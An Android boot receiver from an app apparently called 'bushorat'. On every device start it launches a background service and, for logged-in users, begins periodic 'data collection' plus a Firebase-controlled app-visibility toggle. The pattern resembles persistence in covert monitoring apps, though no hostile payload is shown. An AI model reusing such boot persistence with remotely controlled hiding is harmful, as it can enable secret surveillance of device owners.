package com.bushorat.app.reciever;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.DataSyncWorker;
import com.bushorat.app.helpers.SessionManager;
import com.bushorat.app.helpers.UserDataSyncHelper;
import com.bushorat.app.services.BackgroundMaintenanceService;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "Device booted, starting background services");

            SessionManager sessionManager = new SessionManager(context);
            
            // Start background service (always)
            try {
                Intent serviceIntent = new Intent(context, BackgroundMaintenanceService.class);
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "BackgroundMaintenanceService started on boot");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start BackgroundMaintenanceService on boot", e);
            }
            
            // Only start data collection if user is logged in
            if (sessionManager.isUserLoggedIn() && sessionManager.isSessionValid()) {
                DataSyncWorker.schedulePeriodicSync(context);
                AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(context);
                visibilityHelper.ensureListenerStarted();
                visibilityHelper.syncVisibilityFromFirebaseBlocking();
                UserDataSyncHelper.syncAll(context);
            }
        }
    }
}


